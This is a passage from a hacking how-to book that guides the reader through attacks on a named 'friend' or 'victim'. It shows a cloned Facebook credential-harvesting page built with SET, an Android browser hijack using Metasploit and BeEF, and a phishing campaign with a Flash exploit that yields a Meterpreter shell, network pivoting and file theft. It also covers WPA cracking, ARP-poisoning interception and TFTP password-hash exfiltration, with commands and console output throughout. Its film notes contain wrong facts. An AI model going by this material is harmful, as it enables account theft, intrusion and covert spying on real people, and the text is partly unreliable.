You will be guided to a list of seven different attack vectors and they are all very  good  in  social  engineering  but  the  best  are  Credential  Harvester, Metasploit  Browser,  and  Java  Applet  Attack.  If  you  want  to  have  your friend’s log in data from Facebook you should select Credential Harvester Attack  Method  and  SEToolkit  will  help  you  by  copying  any  website  you want to and much more than that, it will insert a credential stealing code to the HTML. You should be greeted by a screen similar to what is below: The  first  method  will  allow  SET  to  import  a  list  of  pre-defined  web applications that it can utilize within the attack. The second method will completely clone a website of your choosing and allow  you  to  utilize  the  attack  vectors  within  the  completely  same  web application you were attempting to clone. The  third  method  allows  you  to  import  your  own  website  ,  note  that  you should  only  have  an  import  website functionality.  index.html  when  using   the   1       Web Templates 2       Site cloner 3       Custom Import  Set:webattack>_ If  you  choose  the  first  option  you  will  find  out  that  SEToolkit  owns  a Facebook log in page template built into it, in order to let SEToolkit connect to  you,  you  should  give  it  your  Internet  Protocol  address  and  ensure  you choose port 80 and put it onward your IP. And you should be greeted with : [-] Credential harvester will allow you to the clone capabilities within SET   [-] to harvest credentials or parameters from a website as well as place them into a report [-] This option is used for what IP the server will POST to [-] If you’re using an external IP, use your external IP for this Set:webattack>  IP  address  for  the  POST  back  in  Harvester Tabnabbing  : 10.0.1.82_ Next, you must get Apache installed on your system, SEToolkit will present you its web templates and you should use the Facebook one. Your screen should show: 1. Java Required 2. Google 3. Facebook 4. Twitter 5. Yahoo  Set:webattack> Select a template:3_ And because we said that we want to use social engineering on a friend’s Facebook account, you have to type number 3 and hit Enter key. After selecting the option, your screen is supposed to show: [*] Cloning the website http:  facebook.com [*] This could take a little bit The best way to use this attack is if username and password from fields are available. Regardless, this captures ALL POSTs on a website. [*]  Apache  is  set  to  ON.  Everything  will  be  placed  in  your  web  root directory on apache. [*] Files will be written out to the root directory on apache. [*] ALL files have been copied to  var www {Please return to continue}_ And the last thing you should do is sending to your friend an email with your Internet Protocol address as link and wait for your friend to click on it.      %%%%%%%%   Statistics  show  that  1  billion  people  access  monthly  Facebook  only  from  United States, in 1 billion persons clearly  more than half of them are naïve  and  that  is  another  reason  why  we  should  learn  a  new  method  to  hack  Facebook using social engineering. To start, kindly follow the next steps: You  should  use  Linux  to  realize  this  hack  because  you  will  need instruments like Metasploit and BeFF. First, open the first tool mentioned after you fire up Kali Linux, you can  open the tool by writing the syntax  kali > msfconsole . And you should be greeted with a similar screen: %% %% %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% %%  %  %%%%%% %%%%%%%% http:  metasploit.pro %%%%%%% %%  %%%%%%%%%%%%%%%%%%%%%%%%%%%% %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% %%%%%%%%%%%%%%%%%%%%% Now,  you  should  search  for  the  exploit  for  the  hack  and  try  to  find  it  by writing the syntax msf > search platform:android stock browser And  auxiliary gather android_stock_browser_uxss Load  auxiliary gather android_stock_browser_uxss And your screen should show this: Matching Modules ============= Name  Disclosure Date  RankDescription ---- ------------------------ ------------- Auxiliary gather android_stock_browser_uxssnormalAndroid Open Source Platform  AOSP  Browser UXSS  this  module   it  you  are   if  you  do   this  module  supposed   to  get     msf   syntax   using   this   use   >    Msf > use auxiliary gather android_stock_browser_uxss Msf auxiliary  android_stock_browser_uxss   > info   Name: Open Source Platform  AOSP  Browser UXSS   Module: gather android_stock_browser_uxss   License: Metasploit Framework License  BSD  Rank: Normal   Provided by: Rafay Baloch Joev     Basic options:   Get some data about the module by using the syntax  msf > info After that, check what options you need to set for the module to make it  work but the most important is setting  REMOTE_JS. If you did all the work from the above right you may open BeFF tool and the next step is going back to Metasploit now and ensure that you are using the Internet Protocol of the BeEF server, set the JF to BeEF hook msf > set REMOTE_JS http:  192.168.1.107:3000 hook.js To  continue,  you  should  put  URIPATH  to  the  root  directory.    Typing  this  will help youmsf > set uripath   And your screen should show a similarity to: Msf  auxiliary  http:  192.168.1.105 hook .js REMOTE_JS=> http:  192.168.1.105 hook .js msf auxiliary  android_stock_browser_uxss   > set URIPATH   URIPATH =>   Msf auxiliary  android_stock_browser_uxss  >   android_stock_browser_uxss      >  set  REMOTE_JS       Next, you should start the Metasploit server so use the syntax  msf>run After entering the syntax to run the server, your screen must show: Msf auxiliary   android_stock_browser_uxss   > run [*] Auxiliary module execution completed   [*] Using URL: http:  0.0.0.0:8080  [*] Local IP: http:  192.168.1.107:8080  [*] Server started. Msf auxiliary  android_stock_browser_uxss  >   The next step is to navigate to the website from an Android based website  that  is  hosting  the  hook  because  there  is  an  automatically  process  that  happen     injecting  the  JavaScript  into  your  victim’s  browser   and  you  should use the store browser on an Android based device and take a walk to  192.168.1.107:8080 or your site’s Internet Protocol. The  penultimate  thing  to  do  is  to  hanger  the  browser  ,  you  control  the hacked  system’s  browser  when  the  device  is  visiting  your  192.168.1.107 because the BeEF is going to hook their browser immediately. And finally, the last step is detecting if the browser is authenticated to FB, for doing this please go to BeEF and search for Commands tab and beneath the  Network  folder  you  should  find  Detect  Social  Networks  command, clicking on Execute button will see if your victim is authenticated to FB, Twitter or Gmail. BeEF shows as a result that this victim is not authenticated to FB but it was to Twitter. Keep an eye on the operation to see when the victim is back, and when it will open Facebook you can direct a tab to open his her page. But  what  would  you  do  if  you  would  be  the  hacked  one?  Here  are  some advices to get your Facebook account back to you:  Go immediately to https:  www.facebook.com hacked   Access Your Account has been compromised button Provide all the requested data and press Search Facebook will request a current or old password so give them the old one because the hacker maybe has changed it Select Reset My Password Change your primary email address Make sure you type it right Check your email for a password reset link Follow the instructions they give you and normally in 23 hours you shout get your account back.  Myths  about  social  engineering  existed  since  the  old  times  and  will  exist forever, the only way to break them is by studying and trying them, there is no one that can prove you a myth because myths are usually stories created by  limited  minds  that  are  extremely  negative  and  they  are  trying  to influence  the  public  opinion  and  turn  in  100%  against  both  white  hat hackers and black hat hackers but this is not a solution. Unfortunately, the public opinion is working on the principle believe and do not  research,  this  is  the  most  inutile  principle  ever  and  that  is  the  main reason why most of the people are unchallengeable. Actually, negativity is an attention magnet because people tend to read more  about negative things such as attacks and crimes but the main problem is  that  they  are  highly  promoted,  negative  aspects  are  totally  eclipsing  the  positive ones.   This  is  happening  in  hacking  world,  only  the  passionate  people  and  well documented  people  know  about  hacking,  about  the  kinds  of  hackers  and maybe  much  more  than  we  expect  but  why  are  not  white  hat  hackers promoted and highlighted as the black hat hackers? Because if they were, most forms of mass media would lose tons of money and attention and in fact, that is what they want. To use hacking in an educational way is not a cyber crime , hackers help the companies  which  run  the  world  to  make  them  do  it  even  better  but  they   sometimes stay in the shadow of these companies and never show up. Make sure you are well documented about any topic before you create an opinion about it … If  your  curiosity  is  running  out  of  the  limits  and  you  would  go  to  your victim’s house,office and every place visited by your victim just to spy on them you will not resolve a lot of things because you might get caught by police and there is a big risk if your victim observes you and you will waste a lot of time investing in someone else’s person in place of investing time in your person, there is another way to save the situation and invest time in your person by exercising your hacking skills by spying on your victim’s online activity and maybe you find something interesting and hidden about that person. To begin the mission follow the next steps: Set your exploit strategy plan and start by remembering that Adobe Flash Player  is  the  most  vulnerable  application  and  a  hacker  should  take  full advantage of vulnerabilities. The next step is getting your victim’s email address, you need a person at  headquarters to click on  your malicious link document and bring down a  whole network of computers, and Maltego is going to help you at this point  by collecting email addresses. Next, send the ‘’magic email’’ which contains malicious file to the emails you just found using Maltego. Make your malicious code using Metasploit and  initiate  a  server  with  the  malicious  code.  Your  screen  must  show  a similar content to what is below : Msf exploit adobe_flash_pixel_bender_b0f  > exploit [*] Exploit running as background job.     [*] Started reverse handler on 192.168.147.129:4444 [*] Using URL : http:  0.0.0.0:8080 JFr4gsilJM9IUoe [*] Local IP: http:   192.168.147.129:8080 JFr4gsilJM9IUoe [*] Server Started. Msf exploit  adobe_flash_pixel_bender_bof   >     After you just set up a server with the malicious code, get back to Maltego and make a list of what you found using it and start sending emails with the link to the target victim s . As you might know, time can resolve literally anything so take a seat and relax because you have done your job. You have sent the emails and in a period between 24 and 48 hours the victim s  should click your link. After you spent some time waiting, someone has just clicked your link and now  you  officially  have  a  meterpreter  shell  attached  to  their  operating system. So, everything is going on respecting the initial plan and you have got one machine that is under your control but you want to see the other devices on that  network  so  you  will  do  an  ARP  scan  which  more  than  scanning,  is giving you the Internet Protocol address of every machine on that network. Use a similar syntax to this one : meterpreter  >  run  arp_scan  -r  192.168.1.0 24    in  order  to  get  a  screen  similar to this one: meterpreter > run arp_scanner –r 192.168.1.0 24 [*] ARP Scanning 192.168.1.0 24 [*] IP: 192.168.1.101  MAC 00:0c:29:70:c7:2a [*] IP: 192.168.1.102  MAC 00:0c:29:18:6b:db Meterpreter >     Great news! As you can see, ARP is giving you MAC’s as well and more than that, you are able now to pivot all the systems on that network. The  next  step  should  satisfy  your  curiosity  because    after  doing  all  the  above you should start looking what is going on around you, go to the first  system  you  hacked  and  start  looking  for  interesting  files,  you  are  now  capable of seeing the entire hard drive , use the search command to do it  better!   If you want to get more details, please download the file that has just caught your attention from the target system. After you explore the first machine, do not forget about the others on the network! You have just realized that you are a spy lover? Great! Here is another trick for you: Start by firing up Kali and after that make sure you are on the same network with your victim and you can do it in several ways, it is depending on the victim. If  the  victim  is  using  a  wireless  network,  be  happy  because  it  is  not  that complicated to crack a WPA password or a WPS PIN, after finding out the magic word, log into your victim’s AP to get in the same network. If you can get physical access to the victim take full advantage and do it! And if your victim does not match the above, hack the victim’s system and that is the ultimate way to get on the same network. Next, get ready to make a MitM  man-in-the-middle  attack, you can do it using Ettercap. In order to not complicate the situation, use GUI and type the following syntax kali > ettercap –G Next, you should place yourself between the victim and its router, to start doing  this  let  Ettercap  to  breathe  in  on  the  network.  Go  to  the  menu  and select the option Unified sniffing. Choose the crossing point you want to sniff on   if it is on wireless network it should be wlan0 . Move to the next step by letting Ettercap scan for hosts, it will provide you the  Internet  Protocol  address  and  the  MAC  address  for  the  connected systems. To see all the hosts on the network, go to Hosts menu and select the option Hosts list, you must be able after that to see the Internet protocol addresses and the MAC addresses as well. Time to attack! Remain at the same page a look at the top of the screen, you  should find there a Mitm menu, choose from the menu the  Arp poisoning  option and after that, please select your target systems from the list make  the victim be Target 1 and the router Target 2.   Now,  you  should  be  placed  between  the  two  targets,  so  you  have successfully reached your goal but there is still some work to do so, start using  as  a  spy  instrument  Snort,  which  was  developed  for  malicious movements and it is working by picking and inspecting every packet but if you are not interested in see which malicious files are across the traffic you can see whatever you want by simply typing it in Kali. Snort is giving you the option to set your rules, so, you can disable rules which are not in your interest zone and activate rules about what you expect to see on your victim’s software. Continue just by setting rules for what you want and enjoy the spy mission! After  you  finish  your  spy  mission,  make  some  time  to  learn  another interesting hacking trick which is using TFTP to install malicious files on your target system, try and learn how to do it by following the instrunctions below: You should know that a TFTP is a protocol which uses port 69, you can use it  in  order  to  upload  or  download  files  between  systems  and  it  does  not request  authentication.  Installing  a  TFTP  on  a  Kali  Linux  system  allows you to upload hacking software on your target system. Your target should use TFTP too. Start by firing up Kali and after that please open a terminal, after you open the terminal you can start the TFTP server by using the syntax: kali > service atftpd start And then continue with creating a directory which you want to upload the malicious file from by using the next syntax: kali > mkdir  tftpboot Next step is editing the configuration file for atftpd and in this case the text editor recommended is Leafpad, the next syntax might help you: kali > leafpad  etc default atftpd Now, edit the file and save it. Restart the server to see what is going on with the new configuration. Next, copy your malicious file to  tftpboot directory and go to the directory where the software is and then use ‘’cp’’ command to copy it to  tftpboot   directory and you are done with this step. Get connected to the target system now to upload your malicious file, you can use a command shell delivered by Netcat. The  next  instruction  is  moving  the  malicious  file   software  to  your  target after you configure your TFTP server, the syntax used should be similar to the next one : C:\> tftp -i GET 192.168.1.119 samdump2 And the last step in this hack trick is downloading the hashes and save them in a file using the following syntax:   C: tftp -i PUT 192.168.1. 119 hashes.txt Once you have the hashes you can use software like Hashcat or maybe John The Ripper in order to hack the hashes.     CONCLUSION Learning  and  trying  all  the  hack  techniques,  methods,  tips  and  tricks  that are presented in this book will obviously improve your hacking skills even if you try each one of them only once. Also, you can use the hack methods, tips, techniques or even tricks to get inspired enough to create another ones because that is what innovation mean. Between  tying  the  hack  methods,  techniques,  tips  and  tricks  presented across  the  book  you  can  relax  by  watching  some  inspirational  hacking movies like: Hackers  ;  Johnny  Lee  Miller  is  a  young  hacker  boy  that  is  caught  by authorities at only 11 years old for hacking thousands of devices and he gets a sentence that ban him from accessing the computer until the age of 18. The film was made in 1993 but it relates a scenario that is going to happen all the time. WarGames;  the  film  was  produced  in  1993.  Matthew  Broderick  is  a teenager  who  loves  to  hack  and  he  is  doing  from  his  bedroom  using  his laptop. With the hacks he made he was getting World War III closer than ever because he gets access to the Department of Defense's nuclear missile launch controls. The  Girl  with  the  Dragon  Tattoo  ;  Noomi  Rapace  is  in  the  main  role where she is a teen woman who just got out of the prison because she made a crime due to love and passion reasons. She was traumatized in the jail and she works as a hacker for pay and her job makes her meet Mikael who is a writer. The name of the movie is very suggestive because it is perfectly describing her life experience and story. Live free or Die Hard; this movie is pure art! Timothy  Olyphant  is  a  hacker  who  is  taking  down  United  States infrastructures when he tries to hack for big money. Sneakers; Robert Redford and Ben are two young hackers who play and one  of  them  is  ending  up  in  prison  while  the  other  lives  free.  They  meet   after around thirty years and the one who was arrested is working for ‘’ bad guys’’  while  the  other  is  trying  to  find  the  truth  about  his  job.  The  NSA plays the bad guys who want the encryption algorithm so that they can spy on everyone. Ghost in the Shell; awesome movie as well, it reflects the future in Japan where humans are part flesh and blood and part bionic. A lot of the people own cyber brains and this concept is not far from being reality in the future. The legend is about an extraordinary operations mission force that is part- police  and  part-military.  The  front  personality  is  a  female  officer  whose body  was  destroyed  as  young  girl  and  has  been  replaced  by  a  gorgeous bionic body. The hacking in this futuristic tale is the even more malicious variety of hacking, the hacking of the human mind and the human body in general. The  Fifth  Estate;  the  name  suggest  an  unauthorized  hacking  account  of WikiLeaks and Julian Assange. Assange is a big famous hacker broke into the Pentagon, Citibank, NASA, and  Stanford  University,  among  other  facilities,  before  being  caught. WikiLeaks  was  founded  to  provide  a  safe  position  for  whistleblowers  to make  underground  state  information  obtainable  to  the  world  when  that information  reveals  the  ill  deeds  of  influential  governments.  They  were guilty for the leaks about U.S. military abuses in Iraq and Afghanistan, as well as in other spaces.   Although modest hacking takes position in this film, it is an important film for the hacking community as it shows how hacking can change the world’s history, as it will surely do. The  Italian  Job  ;  Seth  Green  turns  into  Lyle,  a  hacker  capable  of  high attacks such as manipulating traffic signals. The movie deserves a watch just to see the devices that are in it!  Hack Ethically  Everything  you  make  is  totally  controlled  by  you,  so  you  are  taking decisions  and  you  are  choosing  the  options  you  want  to  because  you  are   free  to  do  it  and  it  is  your  right  100%,  in  fact  this  is  one  of  the  human fundamental three rights. The book content is teaching you how to hack and it is presenting basically everything you should know about hacking and its importance nowadays. Hacking  should  be  used  in  order  to  reach  your  educational  goals. Everything that happens to you is a package of the results of your actions and you should assume everything you make 100% and do not blame others for your actions. In  life  everything  is  about  action  and  reaction,  the  main  goal  is  to  know where to stop. You are the only person that can change something in your life and you can not be influenced by others because when you consider that you are influenced by others you are actually not, the main problem is the lack of attitude you show in front of your person and that is why you think you are influenced. No one ever should support anything that is not belonging to them; every one of us is influenced by personal decisions, personal attitude and personal lifestyle. Even  if  you  try  to  escape,  in  the  end  it  is  your  decision,  everything  is moving  around  you  and  you  are  the  only  person  to  decide  in  your  case about  what  you  should  do  and  about  what  you  should  not  do,  you  know what is better for you. Good luck in your hacking endeavors but remember to hack ethically!
